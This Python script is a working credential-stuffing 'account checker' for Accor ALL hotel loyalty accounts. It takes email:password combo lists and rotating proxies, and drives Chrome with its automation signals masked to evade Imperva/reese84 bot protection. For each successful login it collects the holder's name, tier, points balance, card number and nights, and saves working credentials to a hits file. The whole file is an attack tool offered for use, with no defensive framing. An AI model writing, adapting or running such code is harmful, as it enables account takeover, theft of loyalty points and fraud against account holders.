#!/usr/bin/env python3
"""
Accor ALL (accor.com) Credential-Based Account Checker
Uses Playwright + real Chrome to bypass Imperva/reese84 anti-bot
Extracts: Name, Loyalty Tier, Points, Card#, Nights
"""

import asyncio
import argparse
import json
import os
import re
import sys
import tempfile
import shutil
from pathlib import Path

try:
    from playwright.async_api import async_playwright, TimeoutError as PwTimeout
except ImportError:
    print("[!] playwright not installed. Run: pip install playwright && python -m playwright install")
    sys.exit(1)


# ─── Proxy Extension Generator ───────────────────────────────────────────────
def create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass, ext_dir):
    """Create a Chrome MV2 extension for proxy authentication."""
    os.makedirs(ext_dir, exist_ok=True)

    manifest = {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth",
        "permissions": ["proxy", "tabs", "unlimitedStorage", "storage",
                        "<all_urls>", "webRequest", "webRequestBlocking"],
        "background": {"scripts": ["background.js"]},
        "minimum_chrome_version": "22.0.0"
    }

    background_js = f"""
var config = {{
    mode: "fixed_servers",
    rules: {{
        singleProxy: {{
            scheme: "http",
            host: "{proxy_host}",
            port: parseInt({proxy_port})
        }},
        bypassList: ["localhost"]
    }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function(){{}});
function callbackFn(details) {{
    return {{
        authCredentials: {{
            username: "{proxy_user}",
            password: "{proxy_pass}"
        }}
    }};
}}
chrome.webRequest.onAuthRequired.addListener(
    callbackFn,
    {{urls: ["<all_urls>"]}},
    ['blocking']
);
"""

    with open(os.path.join(ext_dir, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2)
    with open(os.path.join(ext_dir, "background.js"), "w") as f:
        f.write(background_js)

    return ext_dir


def parse_proxy(proxy_str):
    """
    Parse proxy string in 10+ common formats:
    1.  host:port
    2.  host:port:user:pass
    3.  user:pass@host:port
    4.  http://host:port
    5.  http://user:pass@host:port
    6.  https://user:pass@host:port
    7.  socks5://user:pass@host:port
    8.  socks4://user:pass@host:port
    9.  socks5://host:port
    10. host:port@user:pass (some tools)
    11. user:pass:host:port (reverse - detected by port validity)
    12. protocol://host:port:user:pass (mixed)
    """
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    protocol = 'http'

    # Strip protocol prefix
    for proto in ('socks5://', 'socks4://', 'https://', 'http://'):
        if proxy_str.lower().startswith(proto):
            protocol = proto.rstrip(':/')
            proxy_str = proxy_str[len(proto):]
            break

    host, port, user, passwd = None, None, None, None

    # Format: user:pass@host:port
    if '@' in proxy_str:
        left, right = proxy_str.rsplit('@', 1)
        right_parts = right.split(':')
        left_parts = left.split(':', 1)

        if len(right_parts) == 2 and right_parts[1].isdigit():
            # user:pass@host:port
            host, port = right_parts[0], right_parts[1]
            if len(left_parts) >= 2:
                user, passwd = left_parts[0], left_parts[1]
            else:
                user = left_parts[0]
        elif len(left_parts) == 2 and left_parts[1].isdigit():
            # host:port@user:pass (some tools use this)
            host, port = left_parts[0], left_parts[1]
            rp = right.split(':', 1)
            user = rp[0]
            passwd = rp[1] if len(rp) > 1 else None
        else:
            # Fallback: treat left as auth, right as host:port
            host = right_parts[0]
            port = right_parts[1] if len(right_parts) > 1 else '80'
            user, passwd = left_parts[0], left_parts[1] if len(left_parts) > 1 else None
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2:
            # host:port
            host, port = parts[0], parts[1]
        elif len(parts) == 4:
            # Detect: host:port:user:pass vs user:pass:host:port
            if parts[1].isdigit():
                # host:port:user:pass
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
            elif parts[3].isdigit():
                # user:pass:host:port
                user, passwd, host, port = parts[0], parts[1], parts[2], parts[3]
            else:
                # Default: host:port:user:pass
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
        elif len(parts) == 3:
            # host:port:user (no pass)
            host, port, user = parts[0], parts[1], parts[2]
        else:
            return None

    if not host or not port:
        return None

    try:
        port = int(port)
    except (ValueError, TypeError):
        return None

    return {'host': host, 'port': port, 'user': user, 'pass': passwd, 'protocol': protocol}


# ─── Core Login Flow ──────────────────────────────────────────────────────────
async def do_login_flow(page, email, password, verbose=False):
    """
    Execute the Accor login flow on a given page.
    Assumes page is on all.accor.com (logged out state).
    Returns result dict.
    """
    result = {
        'email': email,
        'password': password,
        'status': 'DEAD',
        'name': None,
        'tier': None,
        'points': None,
        'card': None,
        'nights': None,
        'error': None
    }

    try:
        # Step 1: Get the OAuth authorization URL from the page and navigate to login
        if verbose:
            print(f"  [i] Looking for Sign in button...")

        if 'login.accor.com' not in page.url:
            # Strategy: Extract the OAuth URL from the page
            # The link is inside ace-block-enrollment which uses Shadow DOM
            auth_url = await page.evaluate('''() => {
                // The sign-in link is inside ace-block-enrollment's Shadow DOM
                const el = document.querySelector('ace-block-enrollment');
                if (el && el.shadowRoot) {
                    const link = el.shadowRoot.querySelector('a[href*="authentication"]');
                    if (link) return link.href;
                }
                // Fallback: check regular DOM
                const links = document.querySelectorAll('a[href*="api.accor.com/authentication"]');
                for (const l of links) return l.href;
                return null;
            }''')

            if auth_url:
                if verbose:
                    print(f"  [i] Found OAuth URL, navigating directly...")
                await page.goto(auth_url, wait_until='domcontentloaded', timeout=30000)
                await page.wait_for_timeout(3000)
            else:
                # Fallback: Click the Sign in button using JavaScript (bypass visibility)
                clicked = await page.evaluate('''() => {
                    // Try clicking the header button first
                    const headerBtn = document.querySelector('button[aria-expanded="false"]');
                    if (headerBtn && headerBtn.textContent.includes('Sign in')) {
                        headerBtn.click();
                        return 'header';
                    }
                    return null;
                }''')
                if clicked:
                    await page.wait_for_timeout(1500)
                    # Now click the "Sign in" button in dropdown via JS
                    await page.evaluate('''() => {
                        const btns = document.querySelectorAll('button');
                        for (const b of btns) {
                            const txt = b.textContent.trim();
                            if (txt === 'Sign in') { b.click(); return true; }
                        }
                        // Try links too
                        const links = document.querySelectorAll('a');
                        for (const l of links) {
                            if (l.textContent.trim() === 'Sign in') { l.click(); return true; }
                        }
                        return false;
                    }''')

                # Wait for navigation to login page
                try:
                    await page.wait_for_url('**/login.accor.com/**', timeout=20000)
                except PwTimeout:
                    pass

        # Verify we're on the login page
        if 'login.accor.com' not in page.url:
            result['error'] = f'Failed to reach login page (at: {page.url[:60]})'
            return result

        if verbose:
            print(f"  [i] On login page, entering email...")

        # Step 3: Wait for and fill email
        try:
            email_input = page.locator('input[type="email"], input[type="text"]').first
            await email_input.wait_for(state='visible', timeout=10000)
            await email_input.fill(email)
            await page.wait_for_timeout(300)
        except Exception as e:
            result['error'] = f'Email field error: {str(e)[:80]}'
            return result

        # Step 4: Submit email
        await page.locator('button[type="submit"]').first.click(timeout=5000)
        await page.wait_for_timeout(3000)

        # Step 5: Check what appeared
        page_html = await page.content()

        # Check if account doesn't exist (shows create account form)
        if 'Create your account' in page_html or 'create an account' in page_html.lower():
            result['error'] = 'Account not found (email not registered)'
            return result

        # Check if password field exists
        pw_count = await page.locator('input[type="password"]').count()
        if pw_count == 0:
            # Maybe still loading or different flow
            await page.wait_for_timeout(2000)
            pw_count = await page.locator('input[type="password"]').count()

        if pw_count == 0:
            result['error'] = 'No password field (account may not exist)'
            return result

        if verbose:
            print(f"  [i] Entering password...")

        # Step 6: Fill password
        await page.locator('input[type="password"]').first.fill(password)
        await page.wait_for_timeout(300)

        # Step 7: Submit password
        await page.locator('button[type="submit"]').first.click(timeout=5000)

        if verbose:
            print(f"  [i] Submitted, waiting for result...")

        # Step 8: Wait for redirect away from login.accor.com
        # OAuth flow redirects through multiple URLs back to all.accor.com
        # Wait up to 25s for the URL to leave login.accor.com
        redirected = False
        for _ in range(25):
            await page.wait_for_timeout(1000)
            try:
                current_url = page.url
                if 'login.accor.com' not in current_url:
                    redirected = True
                    break
            except Exception:
                pass

        if not redirected:
            # Still on login.accor.com after 25s - check for error messages
            current_url = page.url
            try:
                page_html = await page.content()
            except Exception:
                page_html = ''
            page_text = page_html.lower()
        else:
            # Successfully redirected away - wait for final page to load
            try:
                await page.wait_for_load_state('domcontentloaded', timeout=15000)
            except Exception:
                pass
            await page.wait_for_timeout(3000)
            current_url = page.url
            try:
                page_html = await page.content()
            except Exception:
                page_html = ''
            page_text = page_html.lower()

        # Check for error messages
        if 'login.accor.com' in current_url:
            if any(x in page_text for x in ['incorrect', 'invalid', 'wrong password', 'mot de passe incorrect']):
                result['error'] = 'Invalid password'
                return result
            elif any(x in page_text for x in ['locked', 'blocked', 'too many attempts', 'verrouillé']):
                result['error'] = 'Account locked / rate limited'
                return result
            elif any(x in page_text for x in ['try again', 'error']):
                result['error'] = 'Login error (check credentials)'
                return result
            else:
                # Still on login page but no clear error - might be loading
                await page.wait_for_timeout(5000)
                if 'login.accor.com' in page.url:
                    result['error'] = 'Login failed (still on login page)'
                    return result

        # If we got redirected away from login.accor.com → SUCCESS
        result['status'] = 'ALIVE'

        if verbose:
            print(f"  [+] LOGIN SUCCESS! Extracting account data...")

        # Step 9: Extract data via API interception
        # Navigate to loyalty page and intercept the customer API response
        await page.bring_to_front()

        api_responses = []

        async def handle_response(response):
            nonlocal api_responses
            url = response.url
            if 'api.accor.com/customer/' in url and response.status == 200:
                try:
                    data = await response.json()
                    api_responses.append(data)
                except Exception:
                    pass

        page.on('response', handle_response)

        try:
            await page.goto('https://all.accor.com/account/en/my-loyalty-program', wait_until='networkidle', timeout=30000)
            await page.wait_for_timeout(5000)
        except Exception:
            pass

        page.remove_listener('response', handle_response)

        # Merge all API responses (pick the one with the most loyalty data)
        api_data = {}
        for resp in api_responses:
            if isinstance(resp, dict):
                # Merge: prefer responses with more loyalty sub-keys
                if 'loyalty' in resp:
                    existing_loyalty = api_data.get('loyalty', {})
                    new_loyalty = resp.get('loyalty', {})
                    if isinstance(new_loyalty, dict) and len(new_loyalty) > len(existing_loyalty if isinstance(existing_loyalty, dict) else {}):
                        api_data = resp
                    elif not api_data:
                        api_data = resp
                elif not api_data:
                    api_data = resp

        if verbose:
            print(f"  [i] API responses captured: {len(api_responses)}, using response with loyalty data: {bool(api_data and 'loyalty' in api_data)}")

        # Extract from API response
        if api_data:
            # Name
            try:
                ind_name = api_data.get('individual', {}).get('individualName', {})
                first = ind_name.get('firstName', '')
                last = ind_name.get('lastName', '')
                if first or last:
                    result['name'] = f"{first} {last}".strip()
            except Exception:
                pass

            # Card number from loyaltyCards
            try:
                cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                if isinstance(cards, list) and cards:
                    result['card'] = str(cards[0].get('cardNumber', ''))
                elif isinstance(cards, dict):
                    result['card'] = str(cards.get('cardNumber', ''))
            except Exception:
                pass

            # Points (nbPoints = reward points)
            try:
                balances = api_data.get('loyalty', {}).get('balances', {})
                nb_pts = balances.get('nbPoints')
                if nb_pts is not None:
                    result['points'] = str(nb_pts)
            except Exception:
                pass

            # Nights
            try:
                balances = api_data.get('loyalty', {}).get('balances', {})
                nights = balances.get('currentNightsBalance')
                if nights is not None:
                    result['nights'] = str(nights)
            except Exception:
                pass

            # Tier/Status - derive from cardCodeTARS or nextTiering
            try:
                # Map cardCodeTARS to tier name
                TIER_MAP = {'A1': 'Classic', 'A2': 'Silver', 'A3': 'Gold', 'A4': 'Platinum', 'A5': 'Diamond', 'A6': 'Limitless'}
                NEXT_TO_CURRENT = {'Silver': 'Classic', 'Gold': 'Silver', 'Platinum': 'Gold', 'Diamond': 'Platinum', 'Limitless': 'Diamond'}

                cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                if isinstance(cards, list) and cards:
                    code = cards[0].get('cardProduct', {}).get('cardCodeTARS', '')
                    if code in TIER_MAP:
                        result['tier'] = TIER_MAP[code]

                # Fallback: derive from nextTiering
                if not result['tier']:
                    member_info = api_data.get('loyalty', {}).get('memberInfo', {})
                    next_tier = member_info.get('nextTiering')
                    if next_tier and next_tier in NEXT_TO_CURRENT:
                        result['tier'] = NEXT_TO_CURRENT[next_tier]
                    elif member_info.get('currentTierCode') or member_info.get('currentTier'):
                        tier = member_info.get('currentTierCode') or member_info.get('currentTier')
                        result['tier'] = tier.strip().title()
            except Exception:
                pass

        # Fallback: extract from page DOM if API didn't work
        if not result['name'] or not result['points']:
            try:
                page_text = await page.text_content('body') or ''
                # Name from header
                name_el = page.locator('button[aria-label*="account" i], button[aria-label*="Account"]')
                if not result['name'] and await name_el.count() > 0:
                    name_text = await name_el.first.text_content()
                    if name_text:
                        result['name'] = name_text.strip()
                # Points from sidebar
                if not result['points']:
                    m = re.search(r'([\d,]+)\s*Reward points', page_text)
                    if m:
                        result['points'] = m.group(1).replace(',', '')
                # Nights from sidebar
                if not result['nights']:
                    m = re.search(r'([\d,]+)\s*Status Points and\s*(\d+)\s*nights', page_text)
                    if m:
                        result['nights'] = m.group(2)
                # Tier
                if not result['tier']:
                    m = re.search(r'Status\s*(Classic|Silver|Gold|Platinum|Diamond|Limitless)', page_text, re.IGNORECASE)
                    if m:
                        result['tier'] = m.group(1).title()
            except Exception:
                pass

        # Card fallback from cookies
        if not result['card']:
            context = page.context
            cookies = await context.cookies()
            for cookie in cookies:
                if cookie['name'] == 'OCC_all.accor' and '|' in cookie['value']:
                    result['card'] = cookie['value'].split('|')[1]

    except Exception as e:
        result['error'] = str(e)[:120]

    return result


# ─── CDP Mode ────────────────────────────────────────────────────────────────
async def check_account_cdp(email, password, cdp_url='http://localhost:29229', verbose=False):
    """Check account using CDP connection to running Chrome."""
    result = {
        'email': email, 'password': password, 'status': 'DEAD',
        'name': None, 'tier': None, 'points': None, 'card': None, 'nights': None, 'error': None
    }

    try:
        async with async_playwright() as p:
            browser = await p.chromium.connect_over_cdp(cdp_url)
            context = browser.contexts[0]

            # Clear login-related cookies to force fresh login
            all_cookies = await context.cookies()
            login_cookies = [c for c in all_cookies if 'accor' in c.get('domain', '')]
            if login_cookies:
                await context.clear_cookies()

            page = await context.new_page()
            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

            if verbose:
                print(f"  [i] CDP: Navigating to all.accor.com...")

            # Navigate to homepage (should show as logged out after cookie clear)
            await page.goto('https://all.accor.com/a/en.html', wait_until='domcontentloaded', timeout=30000)
            await page.wait_for_timeout(3000)

            # Run the login flow
            result = await do_login_flow(page, email, password, verbose)

            await page.close()

    except Exception as e:
        result['error'] = str(e)[:120]

    return result


# ─── Standalone Mode (launches own Chrome) ────────────────────────────────────
async def check_account_standalone(email, password, proxy=None, verbose=False, browser_path=None):
    """Check account by launching a fresh Chrome instance."""
    result = {
        'email': email, 'password': password, 'status': 'DEAD',
        'name': None, 'tier': None, 'points': None, 'card': None, 'nights': None, 'error': None
    }

    ext_dir = None
    user_data_dir = None

    try:
        async with async_playwright() as p:
            launch_args = [
                '--no-first-run',
                '--no-default-browser-check',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-infobars',
            ]

            if proxy:
                if proxy.get('user'):
                    ext_dir = tempfile.mkdtemp(prefix='proxy_ext_')
                    create_proxy_extension(proxy['host'], proxy['port'], proxy['user'], proxy['pass'], ext_dir)
                    launch_args.extend([
                        f'--load-extension={ext_dir}',
                        f'--disable-extensions-except={ext_dir}',
                    ])
                else:
                    launch_args.append(f'--proxy-server={proxy["host"]}:{proxy["port"]}')

            user_data_dir = tempfile.mkdtemp(prefix='accor_chrome_')

            # Find Chrome
            chrome_path = browser_path
            if not chrome_path:
                for path in [
                    shutil.which('google-chrome-stable'),
                    shutil.which('google-chrome'),
                    '/usr/bin/google-chrome-stable',
                    '/usr/bin/google-chrome',
                    '/home/ubuntu/.local/bin/google-chrome',
                    '/opt/google/chrome/google-chrome',
                    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
                ]:
                    if path and os.path.exists(path):
                        chrome_path = path
                        break

            if verbose:
                print(f"  [i] Chrome: {chrome_path or 'Playwright Chromium fallback'}")

            context = await p.chromium.launch_persistent_context(
                user_data_dir,
                executable_path=chrome_path,
                headless=False,
                args=launch_args,
                ignore_default_args=['--enable-automation'],
                viewport={'width': 1280, 'height': 800},
            )

            page = context.pages[0] if context.pages else await context.new_page()
            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

            if verbose:
                print(f"  [i] Navigating to all.accor.com...")

            await page.goto('https://all.accor.com/a/en.html', wait_until='domcontentloaded', timeout=30000)
            await page.wait_for_timeout(3000)

            result = await do_login_flow(page, email, password, verbose)

            await context.close()

    except Exception as e:
        result['error'] = str(e)[:120]
    finally:
        if ext_dir and os.path.exists(ext_dir):
            shutil.rmtree(ext_dir, ignore_errors=True)
        if user_data_dir and os.path.exists(user_data_dir):
            shutil.rmtree(user_data_dir, ignore_errors=True)

    return result


# ─── Output Formatting ────────────────────────────────────────────────────────
def format_result(result):
    """Format checker result for console."""
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"\033[92m[ALIVE]\033[0m {cred}"]
        if result['name']:
            parts.append(f"Name: {result['name']}")
        if result['tier']:
            parts.append(f"Tier: {result['tier']}")
        if result['points']:
            parts.append(f"Points: {result['points']}")
        if result['card']:
            parts.append(f"Card#: {result['card']}")
        if result['nights']:
            parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    else:
        return f"\033[91m[DEAD]\033[0m {cred} | {result.get('error', 'Unknown')}"


def format_result_plain(result):
    """Format without ANSI colors (for file output)."""
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"[ALIVE] {cred}"]
        if result['name']:
            parts.append(f"Name: {result['name']}")
        if result['tier']:
            parts.append(f"Tier: {result['tier']}")
        if result['points']:
            parts.append(f"Points: {result['points']}")
        if result['card']:
            parts.append(f"Card#: {result['card']}")
        if result['nights']:
            parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    else:
        return f"[DEAD] {cred} | {result.get('error', 'Unknown')}"


# ─── Banner ───────────────────────────────────────────────────────────────────
def show_banner():
    banner = r"""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   █████╗ ██╗  ██╗ █████╗ ███████╗ █████╗     ██████╗██╗  ██╗     ║
    ║  ██╔══██╗██║ ██╔╝██╔══██╗╚══███╔╝██╔══██╗   ██╔════╝██║  ██║     ║
    ║  ███████║█████╔╝ ███████║  ███╔╝ ███████║   ██║     ███████║     ║
    ║  ██╔══██║██╔═██╗ ██╔══██║ ███╔╝  ██╔══██║   ██║     ██╔══██║     ║
    ║  ██║  ██║██║  ██╗██║  ██║███████╗██║  ██║██╗╚██████╗██║  ██║     ║
    ║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝     ║
    ║                                                                   ║
    ║               Accor ALL Account Checker v2.0                      ║
    ║                  Akaza Checks | @akaza_isnt (TG)                  ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    print(banner)


# ─── Main logic (original) ───────────────────────────────────────────────────
async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, output_folder="Accor results"):
    """Core checking routine - reused by CLI and menu."""
    # Create output folder
    os.makedirs(output_folder, exist_ok=True)
    hits_path = os.path.join(output_folder, "hits.txt")
    bad_path = os.path.join(output_folder, "bad.txt")

    # Parse proxy
    proxy = None
    proxies = []
    if proxy_arg:
        if os.path.isfile(proxy_arg):
            with open(proxy_arg) as f:
                proxies = [parse_proxy(l) for l in f if l.strip()]
                proxies = [p for p in proxies if p]
            print(f"[*] Loaded {len(proxies)} proxies")
            proxy = proxies[0] if proxies else None
        else:
            proxy = parse_proxy(proxy_arg)
        if proxy:
            print(f"[*] Proxy: {proxy['host']}:{proxy['port']}")

    # Parse combos
    combos = []
    if combo_source:
        if os.path.isfile(combo_source):
            with open(combo_source) as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        e, pw = line.split(':', 1)
                        combos.append((e.strip(), pw.strip()))
            print(f"[*] Loaded {len(combos)} combos")
        elif ':' in combo_source:
            e, pw = combo_source.split(':', 1)
            combos.append((e.strip(), pw.strip()))
    else:
        # Interactive single combo
        e = input("  Email: ").strip()
        pw = input("  Password: ").strip()
        if e and pw:
            combos.append((e, pw))

    if not combos:
        print("[!] No combos")
        return

    if cdp_arg:
        print(f"[*] Mode: CDP ({cdp_arg})")
    else:
        print(f"[*] Mode: Standalone Chrome")

    # Prepare output files
    hits_file = open(hits_path, 'a') if hits_path else None
    bad_file = open(bad_path, 'a') if bad_path else None

    alive = dead = 0

    for i, (email, password) in enumerate(combos):
        print(f"\n[{i+1}/{len(combos)}] {email}")

        if cdp_arg:
            result = await check_account_cdp(email, password, cdp_url=cdp_arg, verbose=verbose)
        else:
            px = proxies[i % len(proxies)] if proxies else proxy
            result = await check_account_standalone(email, password, proxy=px, verbose=verbose, browser_path=chrome_path)

        print(f"  {format_result(result)}")

        if result['status'] == 'ALIVE':
            alive += 1
            if hits_file:
                hits_file.write(format_result_plain(result) + '\n')
                hits_file.flush()
        else:
            dead += 1
            if bad_file:
                bad_file.write(format_result_plain(result) + '\n')
                bad_file.flush()

    print(f"\n{'='*50}")
    print(f"[*] Done: \033[92m{alive} ALIVE\033[0m / \033[91m{dead} DEAD\033[0m / {len(combos)} Total")
    print(f"[*] Hits saved to: {hits_path}")
    print(f"[*] Bad saved to: {bad_path}")

    if hits_file:
        hits_file.close()
    if bad_file:
        bad_file.close()


# ─── Menu-based interface ────────────────────────────────────────────────────
async def menu_mode():
    show_banner()
    print("\n    [1] Start checking")
    print("    [2] Exit")
    choice = input("\n    > ").strip()

    if choice == '1':
        print("\n[*] Enter combo source (file path or email:pass):")
        combo_input = input("    > ").strip()
        if not combo_input:
            print("[!] No combo provided")
            return
        proxy_input = input("[*] Proxy (optional, file path or host:port:user:pass): ").strip() or None
        cdp_input = input("[*] CDP endpoint (optional, e.g. http://localhost:29229): ").strip() or None
        chrome_path = input("[*] Path to Chrome (optional, press Enter for auto-detect): ").strip() or None
        verbose = input("[*] Verbose output? (y/n): ").strip().lower() == 'y'

        await run_checker(combo_input, proxy_input, cdp_input, chrome_path, verbose)
    else:
        print("[*] Exiting")
        sys.exit(0)


# ─── Main entry point ────────────────────────────────────────────────────────
async def main():
    # If command line arguments given, use original CLI mode (backward compatible)
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description='Accor ALL Account Checker v2')
        parser.add_argument('-c', '--combo', help='Email:pass combo (single) or combo file path')
        parser.add_argument('-p', '--proxy', help='Proxy (host:port:user:pass) or proxy file')
        parser.add_argument('-o', '--output', help='Output file for hits (deprecated, now uses folder)')
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
        parser.add_argument('--cdp', help='CDP endpoint (e.g. http://localhost:29229)')
        parser.add_argument('--chrome', help='Path to Chrome executable')
        args = parser.parse_args()

        # Override output folder to "Accor results" always
        output_folder = "Accor results"
        await run_checker(args.combo, args.proxy, args.cdp, args.chrome, args.verbose, output_folder)
    else:
        # No args → menu mode
        await menu_mode()


if __name__ == '__main__':
    asyncio.run(main())